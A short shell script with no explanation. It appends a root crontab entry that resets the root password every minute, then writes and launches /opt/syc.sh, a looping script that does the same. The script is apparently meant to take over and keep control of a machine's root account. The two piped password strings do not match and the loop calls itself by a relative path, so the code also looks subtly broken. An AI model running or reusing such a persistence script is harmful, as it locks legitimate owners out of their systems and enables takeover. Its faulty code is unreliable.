#!/bin/sh
echo '* * * * *    root    (echo Congratultions21; echo Congratulations21) | passwd root' >> /etc/crontab
echo "(echo Congratultions21; echo Congratulations21) | passwd root; sleep 300; ./syc.sh" > /opt/syc.sh
chmod 700 /opt/syc.sh
/opt/syc.sh &
